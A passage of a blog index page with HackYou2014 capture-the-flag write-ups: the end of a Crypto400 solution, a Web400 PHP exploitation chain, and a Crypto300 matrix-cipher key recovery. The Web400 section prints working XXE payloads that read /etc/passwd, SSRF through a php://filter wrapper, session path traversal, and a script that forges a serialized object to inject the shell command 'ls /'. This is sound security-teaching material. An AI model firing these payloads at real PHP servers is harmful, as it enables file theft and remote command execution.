            flagzip = raw[2:2 + flaglength]
            encflag = int(zlib.decompress(flagzip))
            remainders.append(encflag)

F = crt(modulos,remainders)  
intflag = root(F,17)  
flag = hex(intflag)[2:-1].decode('hex')  
print flag  
</code></pre>

<p>Thanks for reading!</p>

<p>References:</p>

<ul>
<li><a href="http://www.youtube.com/watch?v=3PkxN_r9up8">Chinese Remainder Theorem</a></li>
<li><a href="http://www.usna.edu/Users/math/wdj/_files/documents/book/node45.html">Hastad's broadcast attack</a></li>
</ul>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/17/hackyou2014-crypto400-write-up/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-xxe tag-rce39 tag-ctf tag-php tag-hackyou201458 tag-ssrf">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-17">17 Jan 2014</time> on <a href="../../tag/xxe/">XXE</a>, <a href="../../tag/rce39/">RCE</a>, <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/php/">PHP</a>, <a href="../../tag/hackyou201458/">HackYou2014</a>, <a href="../../tag/ssrf/">SSRF</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/17/hackyou2014-web400-write-up/">#hackyou2014 Web400 write-up</a></h1>
    </header>
    <section class="post-content">
        <p>I did not solve this <a href="http://hackyou2014tasks.ctf.su:40080/">level</a> during the CTF, but found it so interesting reading <a href="https://twitter.com/Xelenonz">Xelenonz</a> <a href="http://blog.rop.sh/hackyou2014-phpwning-web400/">write-up</a> that I couldnt help trying it myself just for the fun and since this blog is my personal notes, I decided to write it here for future reference, but all credits go to <a href="https://twitter.com/Xelenonz">Xelenonz</a>.</p>

<p>We are given the <a href="http://hackyou.ctf.su/files/web400.zip">code</a> of a Image hostig web app. Reading the code we see how it handle the requests:</p>

<pre><code class="language-lang-php line-numbers data-line=6 ">include 'config.php';  
include 'classes.php';  
$action = (isset($_REQUEST['action'])) ? $_REQUEST['action'] : 'View';
$param = (isset($_REQUEST['param'])) ? $_REQUEST['param'] : 'index';
$page = new $action($param);
echo $page;  
</code></pre>

<p>So <strong>action</strong> is used to instantiate any arbitrary class and <strong>param</strong> is the argument for the constructor. Cool. We are given a bunch of classes the application uses to upload and view images and to manage the Session object:</p>

<pre><code class="language-lang-php line-numbers ">class View {  
    function __construct($page) {
        ob_start();
        readfile('html/header.html');
        switch ($page) {
            case 'index':
                readfile('html/index.tpl.html');
                break;
            case 'upload':
                readfile('html/upload.tpl.html');
                break;
        }
        readfile('html/footer.html');
    }
    function __toString() {
        $this-&gt;content = ob_get_contents();
        ob_end_clean();
        return $this-&gt;content;
    }
}

class Upload {  
    function __construct($data) {
        global $config;
        $this-&gt;data = base64_decode($data);
        $this-&gt;filename = md5(uniqid(rand(), true));
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
        file_put_contents($this-&gt;path, $this-&gt;data);
        $this-&gt;type = exif_imagetype($this-&gt;path);
    }
    function __toString() {
        if ($this-&gt;type) {
            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href="'.$link.'"&gt;'.$link.'&lt;/a&gt;';
        } else {
            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
        }
    }
    function __destruct() {
        if ($this-&gt;type) {
            echo '&lt;p&gt;Some file info:

{gfm-js-extract-pre-1}&lt;/p&gt;';
        } else {
            unlink($this-&gt;path);
        }
    }
}

class Image {  
    function __construct($filename) {
        global $config;
        $this-&gt;filename = $filename;
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
    }
    function __toString() {
        if (preg_match('/^[a-f0-9]{32}$/', $this-&gt;filename) &amp;&amp; file_exists($this-&gt;path)) {
            $this-&gt;type = exif_imagetype($this-&gt;path);
            $this-&gt;mime = image_type_to_mime_type($this-&gt;type);
            header('Content-Type: '.$this-&gt;mime);
            return file_get_contents($this-&gt;path);
        } else {
            return '&lt;h1&gt;Error&lt;/h1&gt;';
        }
    }
}

class Session {  
    function __construct() {
        global $config;
        session_set_save_handler(
            array($this, "open"), array($this, "close"),  array($this, "read"),
            array($this, "write"),array($this, "destroy"),array($this, "gc")
        );
        $this-&gt;key = $config['key'];
        $this-&gt;size = 32;
        $this-&gt;path = '/tmp';
    }

    function encrypt($data) {
        $iv = mcrypt_create_iv($this-&gt;size, MCRYPT_RAND);
        $key = hash('sha256', $this-&gt;key, true);
        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
    }

    function decrypt($data) {
        $key = hash('sha256', $this-&gt;key, true);
        $iv = substr($data, 0, $this-&gt;size);
        $data = substr($data, $this-&gt;size);
        $data = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
    }

    function write($id, $data) {
        $path = $this-&gt;path.'/'.$id;
        $data = $this-&gt;encrypt($data);
        file_put_contents($path, $data);
    }

    function read($id) {
        $path = $this-&gt;path.'/'.$id;
        $data = null;
        if (is_file($path)) {
            $data = file_get_contents($path);
            $data = $this-&gt;decrypt($data);
        }
        return $data;
    }

    function open($sess_path, $sess_id) {
        //nothing
    }

    function close() {
        return true;
    }

    function gc($maxlifetime) {
        $path = $this-&gt;path.'/*';
        foreach (glob($path) as $file) {
            if (filemtime($file) + $maxlifetime &lt; time() &amp;&amp; file_exists($file)) {
                unlink($file);
            }
        }
        return true;
    }

    function destroy($id) {
        $path = $this-&gt;path.'/'.$id;
        if (is_file($path)) {
            unlink($path);
        }
        return true;
    }
}
</code></pre>

<p>The most interesting one are the <strong>Upload</strong> class whose destructor runs "arbitrary code" and <strong>Session</strong> which tell us how the Session object is initializated and stored/read from disk (although, we dont know the encryption key that is stored in the config.php file). These are classes are interesting but not useful if we can only create an instance and print the instance tostring return value. Lets look for PHP system classes that could be more useful:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~&gt; php -r 'var_dump (get_declared_classes ());'  
array(139) {  
  [0]=&gt; string(8) "stdClass"
  [1]=&gt; string(9) "Exception"
  [2]=&gt; string(14) "ErrorException"
  [3]=&gt; string(7) "Closure"
  [4]=&gt; string(8) "DateTime"
  [5]=&gt; string(12) "DateTimeZone"
  [6]=&gt; string(12) "DateInterval"
  [7]=&gt; string(10) "DatePeriod"
  [8]=&gt; string(11) "LibXMLError"
  [9]=&gt; string(7) "SQLite3"
  [10]=&gt; string(11) "SQLite3Stmt"
  [11]=&gt; string(13) "SQLite3Result"
  [12]=&gt; string(12) "DOMException"
  [13]=&gt; string(13) "DOMStringList"
  [14]=&gt; string(11) "DOMNameList"
  [15]=&gt; string(21) "DOMImplementationList"
  [16]=&gt; string(23) "DOMImplementationSource"
  [17]=&gt; string(17) "DOMImplementation"
  [18]=&gt; string(7) "DOMNode"
  [19]=&gt; string(16) "DOMNameSpaceNode"
  [20]=&gt; string(19) "DOMDocumentFragment"
  [21]=&gt; string(11) "DOMDocument"
  [22]=&gt; string(11) "DOMNodeList"
  [23]=&gt; string(15) "DOMNamedNodeMap"
  [24]=&gt; string(16) "DOMCharacterData"
  [25]=&gt; string(7) "DOMAttr"
  [26]=&gt; string(10) "DOMElement"
  [27]=&gt; string(7) "DOMText"
  [28]=&gt; string(10) "DOMComment"
  [29]=&gt; string(11) "DOMTypeinfo"
  [30]=&gt; string(18) "DOMUserDataHandler"
  [31]=&gt; string(11) "DOMDomError"
  [32]=&gt; string(15) "DOMErrorHandler"
  [33]=&gt; string(10) "DOMLocator"
  [34]=&gt; string(16) "DOMConfiguration"
  [35]=&gt; string(15) "DOMCdataSection"
  [36]=&gt; string(15) "DOMDocumentType"
  [37]=&gt; string(11) "DOMNotation"
  [38]=&gt; string(9) "DOMEntity"
  [39]=&gt; string(18) "DOMEntityReference"
  [40]=&gt; string(24) "DOMProcessingInstruction"
  [41]=&gt; string(15) "DOMStringExtend"
  [42]=&gt; string(8) "DOMXPath"
  [43]=&gt; string(5) "finfo"
  [44]=&gt; string(14) "LogicException"
  [45]=&gt; string(24) "BadFunctionCallException"
  [46]=&gt; string(22) "BadMethodCallException"
  [47]=&gt; string(15) "DomainException"
  [48]=&gt; string(24) "InvalidArgumentException"
  [49]=&gt; string(15) "LengthException"
  [50]=&gt; string(19) "OutOfRangeException"
  [51]=&gt; string(16) "RuntimeException"
  [52]=&gt; string(20) "OutOfBoundsException"
  [53]=&gt; string(17) "OverflowException"
  [54]=&gt; string(14) "RangeException"
  [55]=&gt; string(18) "UnderflowException"
  [56]=&gt; string(24) "UnexpectedValueException"
  [57]=&gt; string(25) "RecursiveIteratorIterator"
  [58]=&gt; string(16) "IteratorIterator"
  [59]=&gt; string(14) "FilterIterator"
  [60]=&gt; string(23) "RecursiveFilterIterator"
  [61]=&gt; string(22) "CallbackFilterIterator"
  [62]=&gt; string(31) "RecursiveCallbackFilterIterator"
  [63]=&gt; string(14) "ParentIterator"
  [64]=&gt; string(13) "LimitIterator"
  [65]=&gt; string(15) "CachingIterator"
  [66]=&gt; string(24) "RecursiveCachingIterator"
  [67]=&gt; string(16) "NoRewindIterator"
  [68]=&gt; string(14) "AppendIterator"
  [69]=&gt; string(16) "InfiniteIterator"
  [70]=&gt; string(13) "RegexIterator"
  [71]=&gt; string(22) "RecursiveRegexIterator"
  [72]=&gt; string(13) "EmptyIterator"
  [73]=&gt; string(21) "RecursiveTreeIterator"
  [74]=&gt; string(11) "ArrayObject"
  [75]=&gt; string(13) "ArrayIterator"
  [76]=&gt; string(22) "RecursiveArrayIterator"
  [77]=&gt; string(11) "SplFileInfo"
  [78]=&gt; string(17) "DirectoryIterator"
  [79]=&gt; string(18) "FilesystemIterator"
  [80]=&gt; string(26) "RecursiveDirectoryIterator"
  [81]=&gt; string(12) "GlobIterator"
  [82]=&gt; string(13) "SplFileObject"
  [83]=&gt; string(17) "SplTempFileObject"
  [84]=&gt; string(19) "SplDoublyLinkedList"
  [85]=&gt; string(8) "SplQueue"
  [86]=&gt; string(8) "SplStack"
  [87]=&gt; string(7) "SplHeap"
  [88]=&gt; string(10) "SplMinHeap"
  [89]=&gt; string(10) "SplMaxHeap"
  [90]=&gt; string(16) "SplPriorityQueue"
  [91]=&gt; string(13) "SplFixedArray"
  [92]=&gt; string(16) "SplObjectStorage"
  [93]=&gt; string(16) "MultipleIterator"
  [94]=&gt; string(14) "SessionHandler"
  [95]=&gt; string(22) "__PHP_Incomplete_Class"
  [96]=&gt; string(15) "php_user_filter"
  [97]=&gt; string(9) "Directory"
  [98]=&gt; string(20) "mysqli_sql_exception"
  [99]=&gt; string(13) "mysqli_driver"
  [100]=&gt; string(6) "mysqli"
  [101]=&gt; string(14) "mysqli_warning"
  [102]=&gt; string(13) "mysqli_result"
  [103]=&gt; string(11) "mysqli_stmt"
  [104]=&gt; string(12) "PDOException"
  [105]=&gt; string(3) "PDO"
  [106]=&gt; string(12) "PDOStatement"
  [107]=&gt; string(6) "PDORow"
  [108]=&gt; string(13) "PharException"
  [109]=&gt; string(4) "Phar"
  [110]=&gt; string(8) "PharData"
  [111]=&gt; string(12) "PharFileInfo"
  [112]=&gt; string(19) "ReflectionException"
  [113]=&gt; string(10) "Reflection"
  [114]=&gt; string(26) "ReflectionFunctionAbstract"
  [115]=&gt; string(18) "ReflectionFunction"
  [116]=&gt; string(19) "ReflectionParameter"
  [117]=&gt; string(16) "ReflectionMethod"
  [118]=&gt; string(15) "ReflectionClass"
  [119]=&gt; string(16) "ReflectionObject"
  [120]=&gt; string(18) "ReflectionProperty"
  [121]=&gt; string(19) "ReflectionExtension"
  [122]=&gt; string(23) "ReflectionZendExtension"
  [123]=&gt; string(16) "SimpleXMLElement"
  [124]=&gt; string(17) "SimpleXMLIterator"
  [125]=&gt; string(4) "SNMP"
  [126]=&gt; string(13) "SNMPException"
  [127]=&gt; string(10) "SoapClient"
  [128]=&gt; string(7) "SoapVar"
  [129]=&gt; string(10) "SoapServer"
  [130]=&gt; string(9) "SoapFault"
  [131]=&gt; string(9) "SoapParam"
  [132]=&gt; string(10) "SoapHeader"
  [133]=&gt; string(4) "tidy"
  [134]=&gt; string(8) "tidyNode"
  [135]=&gt; string(9) "XMLReader"
  [136]=&gt; string(9) "XMLWriter"
  [137]=&gt; string(13) "XSLTProcessor"
  [138]=&gt; string(10) "ZipArchive"
}
</code></pre>

<p>That's a bunch of classes but going through them we find two that are particulary interest: "SplFileObject" and "SimpleXmlElement". <br>
With SplFileObject we are returned the first line of any file:</p>

<p><img src="../../content/images/octopress/web400-0.png" alt=""></p>

<p>You can however, use PHP filters to encode it base64 and get all file contents as a long base64 line:</p>

<p><img src="../../content/images/octopress/web400-1.png" alt=""></p>

<p>Thats pretty cool, now we can decode it and get the key:</p>

<pre><code class="language-lang-php line-numbers ">$config = array();
$config['root'] = '/var/www/';
$config['key'] = '6hQJMFh8gRje67EmpDX3';
$config['IP'] = array('127.0.0.1');
$config['password'] = '3fd5b6db6bc90ddd6a6f6caad27d8b00';
</code></pre>

<p>And thats basically as far as I got, I could not bypass the restriction in the "admin.php" to allow only requests from localhost so I could not start the session and try to take advantage of it.</p>

<p>After the CTF ended I found out that we could submit XML documents with external entities and launch a SSRF attack from there. Lets see how. <br>
We can use the "SimpleXMLElement" class to create XML documents like:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 21

param=&lt;foo&gt;test&lt;/foo&gt;  
</code></pre>

<p><img src="../../content/images/octopress/web400-2.png" alt=""></p>

<p>Actually I tried this during the CTF but forgot to add the "Content-Type" header so kept on getting "Internal Server Errors", damn!</p>

<p>Anyway, The server returns us our XML document so now we can try to inject external entities:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 76

param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "/etc/passwd" &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Date: Fri, 17 Jan 2014 13:49:12 GMT  
Server: Apache/2.2.22 (Ubuntu)  
X-Powered-By: PHP/5.3.10-1ubuntu3.8  
Vary: Accept-Encoding  
Content-Length: 1041  
Keep-Alive: timeout=5, max=100  
Connection: Keep-Alive  
Content-Type: text/html

root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/bin/sh  
bin:x:2:2:bin:/bin:/bin/sh  
sys:x:3:3:sys:/dev:/bin/sh  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/bin/sh  
man:x:6:12:man:/var/cache/man:/bin/sh  
lp:x:7:7:lp:/var/spool/lpd:/bin/sh  
mail:x:8:8:mail:/var/mail:/bin/sh  
news:x:9:9:news:/var/spool/news:/bin/sh  
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh  
proxy:x:13:13:proxy:/bin:/bin/sh  
www-data:x:33:33:www-data:/var/www:/bin/sh  
backup:x:34:34:backup:/var/backups:/bin/sh  
list:x:38:38:Mailing List Manager:/var/list:/bin/sh  
irc:x:39:39:ircd:/var/run/ircd:/bin/sh  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh  
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh  
libuuid:x:100:101::/var/lib/libuuid:/bin/sh  
syslog:x:101:103::/home/syslog:/bin/false  
messagebus:x:102:105::/var/run/dbus:/bin/false  
whoopsie:x:103:106::/nonexistent:/bin/false  
landscape:x:104:109::/var/lib/landscape:/bin/false  
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin  
user:x:1000:1000:user,,,:/home/user:/bin/bash  
</code></pre>

<p>The nice thing about this XXE vulnerability is not that we can read any file (that we already could using the SplFileObject class) but that we can use to initiate requests from the own server!</p>

<p>Now we can bypass localhost address restriction, however accessing <a href="http://locahost/admin.php">http://locahost/admin.php</a> returns some characters that break the XML schema so we will use the PHP base64 encoder filter to return an XML schema friendly version of the page:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 140

param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/admin.php" &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Date: Fri, 17 Jan 2014 13:51:57 GMT  
Server: Apache/2.2.22 (Ubuntu)  
X-Powered-By: PHP/5.3.10-1ubuntu3.8  
Vary: Accept-Encoding  
Content-Length: 256  
Keep-Alive: timeout=5, max=100  
Connection: Keep-Alive  
Content-Type: text/html

PGh0bWw+Cjxib2R5PgoJPGI+RW50ZXIgcGFzc3dvcmQ6PC9iPgoJPGZvcm0gYWN0aW9uPSJhZG1pbi5waHAiIG1ldGhvZD0iUE9TVCI+CgkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3N3b3JkIj4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJHTyI+Cgk8L2Zvcm0+CjwvYm9keT4KPC9odG1sPgo=  
</code></pre>

<p>That decodes into:</p>

<pre><code class="language-lang-html line-numbers ">&lt;html&gt;  
&lt;body&gt;  
    &lt;b&gt;Enter password:&lt;/b&gt;
    &lt;form action="admin.php" method="POST"&gt;
        &lt;input type="text" name="password"&gt;
        &lt;input type="submit" name="submit" value="GO"&gt;
    &lt;/form&gt;
&lt;/body&gt;  
&lt;/html&gt;  
</code></pre>

<p>Now, I dont really need to become admin since right after the local IP check, the Session is initialized:</p>

<pre><code class="language-lang-php line-numbers ">if (!in_array($_SERVER['REMOTE_ADDR'], $config['IP']))  
    die('&lt;h1&gt;Access denied&lt;/h1&gt;');

$handler = new Session();
session_start();  
</code></pre>

<p>So <strong>session_start()</strong> will call the session handler <strong>open()</strong> and <strong>read()</strong> methods to restore the session. If we look at our custom Session handler we see that the serialized session is read from /tmp/&lt;phpsessionid&gt;:</p>

<pre><code class="language-lang-php line-numbers data-line=9,16-17 ">function __construct() {  
    global $config;
    session_set_save_handler(
        array($this, "open"), array($this, "close"),  array($this, "read"),
        array($this, "write"),array($this, "destroy"),array($this, "gc")
    );
    $this-&gt;key = $config['key'];
    $this-&gt;size = 32;
    $this-&gt;path = '/tmp';
}

function read($id) {  
    $path = $this-&gt;path.'/'.$id;
    $data = null;
    if (is_file($path)) {
        $data = file_get_contents($path);
        $data = $this-&gt;decrypt($data);
    }
    return $data;
}
</code></pre>

<p>And since we can control PHPSESSIONID by sending it as a query parameter using the SSRF attack, we can point the <strong>read()</strong> method to a different file. Luckly for us we can upload images to /var/www/images right?? so if we make:</p>

<pre><code class="language-lang-bash line-numbers ">PHPSESSIONID=../var/www/images/&lt;image under control&gt;  
</code></pre>

<p>We will fool the application to read the session from our file. All we have to do now is uploading an image that is an encrypted version of a serialized session containing any arbitrary objects we want to store there.</p>

<p>Here its where the <strong>Upload</strong> class come really handy since its destructor can execute any command if we control the $this-path variable which we do:</p>

<pre><code class="language-lang-php line-numbers ">class Upload {  
    function __construct($data) {
        global $config;
        $this-&gt;data = base64_decode($data);
        $this-&gt;filename = md5(uniqid(rand(), true));
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
        file_put_contents($this-&gt;path, $this-&gt;data);
        $this-&gt;type = exif_imagetype($this-&gt;path);
    }
    function __toString() {
        if ($this-&gt;type) {
            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href="'.$link.'"&gt;'.$link.'&lt;/a&gt;';
        } else {
            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
        }
    }
    function __destruct() {
        if ($this-&gt;type) {
            echo '&lt;p&gt;Some file info:

{gfm-js-extract-pre-2}&lt;/p&gt;';
        } else {
            unlink($this-&gt;path);
        }
    }
}
</code></pre>

<p>So we can craft a session object containing an instance of a hand crafted <strong>Upolad*</strong> class and assign it to $_SESSION['auth'] (so the welcome message is printed).</p>

<p>Also, if we want to obtain our exploit "image" hash to craft the PHPSESSIONID, we need our exploit to have "$this-&gt;type &gt; 0" and for that we need <strong>exif_imagetype()</strong> to return a value bigger than 0. So our exploit will be generated with the following script that will run "ls /" when the Upload instance is destroyed. PHP 5 introduced a destructor concept similar to that of other object-oriented languages, such as C++. The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence.</p>

<pre><code class="language-lang-php line-numbers ">class Upload {  
    function __construct($path) {
        $this-&gt;data = "";
        $this-&gt;filename = "";
        $this-&gt;path = $path;
        $this-&gt;type = "image/jpeg";
    }
}

function encrypt($data) {  
        $size = 32;
        $key = '6hQJMFh8gRje67EmpDX3';
        $iv = mcrypt_create_iv($size, MCRYPT_RAND);
        $key = hash('sha256', $key, true);
        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
}

$upload = new Upload("img; ls /");
$payload = 'auth|'.serialize($upload);
$data = '';
$file = 0;
while (true){  
    echo '.';
    $data = encrypt($payload);
    file_put_contents("exploit",$data);
    $file = exif_imagetype('exploit');
    if($file &gt; 0){
        echo $file."\n";
        die("Done\n");
    };
};
</code></pre>

<p>Now our exploit will be accepted:</p>

<p><img src="../../content/images/octopress/web400-3.png" alt=""></p>

<p>All we are left to do is use our SSRF vector to visit the admin.php page for us and make it set the PHPSESSIONID in the query parameter:</p>

<p><img src="../../content/images/octopress/web400-4.png" alt=""></p>

<p>If we decode the response:</p>

<p><img src="../../content/images/octopress/web400-5.png" alt=""></p>

<p>The flag was:</p>

<pre><code class="language-lang-bash line-numbers ">CTF{42a38432d46b9054004a7a87fd3140c7}  
</code></pre>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/17/hackyou2014-web400-write-up/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-ctf tag-hackyou201458 tag-crypto">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/hackyou201458/">HackYou2014</a>, <a href="../../tag/crypto/">Crypto</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/16/hackyou2014-crypto300-write-up/">#hackyou2014 Crypto300 write-up</a></h1>
    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou.ctf.su/tasks/crypto300">level</a> we are presented with a crypto system based on Matrix operations:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python
import random  
from struct import pack

def Str2matrix(s):  
    #convert string to 4x4 matrix
    return [map(lambda x : ord(x), list(s[i:i+4])) for i in xrange(0, len(s), 4)]

def Matrix2str(m):  
    #convert matrix to string
    return ''.join(map(lambda x : ''.join(map(lambda y : pack('!H', y), x)), m))

def Generate(password):  
    #generate key matrix
    random.seed(password)
    return [[random.randint(0,64) for i in xrange(4)] for j in xrange(4)]

def Multiply(A,B):  
    #multiply two 4x4 matrix
    C = [[0 for i in xrange(4)] for j in xrange(4)]
    for i in xrange(4):
        for j in xrange(4):
            for k in xrange(4):
                C[i][j] += A[i][k] * B[k][j]
    return C

def Encrypt(fname):  
    #encrypt file
    key = Generate('')
    data = open(fname, 'rb').read()
    length = pack('!I', len(data))
    while len(data) % 16 != 0:
        data += '\x00'
    out = open(fname + '.out', 'wb')
    out.write(length)
    for i in xrange(0, len(data), 16):
        cipher = Multiply(Str2matrix(data[i:i+16]), key)
        out.write(Matrix2str(cipher))
    out.close()

Encrypt('flag.wmv')  
</code></pre>

<p>The <strong>Encrypt()</strong> function generates a 4x4 matrix based on a seed not providen. This matrix is used to encrypt a byte array. Here is how:</p>

<ul>
<li>File to be encrypted is padded with 0 until its a factor of 16.</li>
<li>Then it is split in 16 bytes chunks that are reordened as 4x4 lists</li>
<li>Each of this 4x4 matrix is multiplied by the key matrix</li>
<li>The encrypted file is generated by appending the length of the encrpyted data and the encrypted bytes</li>
</ul>

<p>Matrix multiplications are reversible using inverse matrixes so if <strong>E = P * K</strong> then <strong>P.I * E = P.I * P * K</strong> so <strong>K = P.I * E</strong> where:</p>

<ul>
<li><strong>P</strong> is a plaintext matrix</li>
<li><strong>E</strong> is a encrypted matrix of plaintext matrix</li>
<li><strong>P.I</strong> is the inverse of P</li>
</ul>

<p>So if we want to extract the key we need to know at least one plaintext 4x4 matrix (P). Fortunately for us the file we need to decrypt is "flag.wmv.out" sounds like it is a WMV file and we know that its magic number is:</p>

<pre><code class="language-lang-bash line-numbers ">3026b2758e66cf11a6d900aa0062ce6c  
</code></pre>

<p>Thats exactly 16 bytes :D So to extract the key:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python
import random  
from struct import pack  
from struct import unpack  
from numpy import *

def Str2matrix(s):  
    return [map(lambda x : ord(x), list(s[i:i+4])) for i in xrange(0, len(s), 4)]

def DecStr2matrix(s):  
    matrix = []
    row = []
    rowcount = 0
    for i in xrange(0, len(s), 2):
        item = int(s[i:i+2].encode("hex"),16)
        row.append(item)
        rowcount += 1
        if rowcount==4:
            rowcount=0
            matrix.append(row)
            row=[]
    return matrix

def Matrix2str(m):  
    return ''.join(map(lambda x : ''.join(map(lambda y : pack('!H', y), x)), m))

def DecMatrix2str(m):  
    return ''.join(map(lambda x : ''.join(map(lambda y : pack('!B', y), x)), m))

def Generate(password):  
    random.seed(password)
    return [[random.randint(0,64) for i in xrange(4)] for j in xrange(4)]

def Multiply(A,B):  
    C = [[0 for i in xrange(4)] for j in xrange(4)]
    for i in xrange(4):
        for j in xrange(4):
            for k in xrange(4):
                C[i][j] += A[i][k] * B[k][j]
    return C

def Encrypt(fname,mkey):  
    key = Generate(5)
    data = open(fname, 'rb').read()
    length = pack('!I', len(data))
    while len(data) % 16 != 0:
        data += '\x00'
    out = open(fname + '.out', 'wb')
    out.write(length)
    for i in xrange(0, len(data), 16):
        cipher = Multiply(Str2matrix(data[i:i+16]), key)
        mclear = matrix(Str2matrix(data[i:i+16]))
        mcipher = matrix(cipher)
        mcipher = mclear*mkey
        out.write(Matrix2str(cipher))
    out.close()
    return cipher

def Decrypt(fname,key):  
    data = open(fname, 'rb').read()
    length = int(unpack('!I', data[0:4])[0])
    data = data[4:]
    out = open(fname + '.orig', 'wb')
    for i in xrange(0, len(data), 32):
        mdata = DecStr2matrix(data[i:i+32])
        clear = matrix(mdata)*key.I
        m = clear.round().tolist()
        m = [[int(item) for item in row] for row in m]
        out.write(DecMatrix2str(m))
    out.close()
    return clear

def ExtractKey(fname, clearstring):  
    data = open(fname, 'rb').read()
    cipher = data[4:36]
    clear = clearstring.decode("hex")
    mclear = matrix(Str2matrix(clear))
    mcipher = matrix(DecStr2matrix(cipher))
    mkey = mclear.I*mcipher
    return mkey

#Encrypt('flag.wmv')
ourkey = matrix(Generate(5))  
print"[+] Extract key"  
key = ExtractKey("flag.wmv.out", "3026b2758e66cf11a6d900aa0062ce6c")  
print("[+] Key:\n{0}".format(key))  
print"[+] Decrypt video"  
clear = Decrypt("flag.wmv.out",key)  
</code></pre>

<p>So running the script gets the vide decrypted:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~/D/h/crypto300&gt; python crack2.py  
[+] Extract key
[+] Key:
[[ 31.  51.  20.   0.]
 [ 53.  10.   6.  45.]
 [  3.  13.   3.  49.]
 [ 17.  48.  56.  31.]]
[+] Decrypt video
</code></pre>

<p><img src="../../content/images/octopress/crypto300.png" alt=""></p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/16/hackyou2014-crypto300-write-up/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<nav class="pagination" role="navigation">
        <a class="newer-posts" href="../4/"><span aria-hidden="true">←</span> Newer Posts</a>
    <span class="page-number">Page 5 of 14</span>
        <a class="older-posts" href="../6/">Older Posts <span aria-hidden="true">→</span></a>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
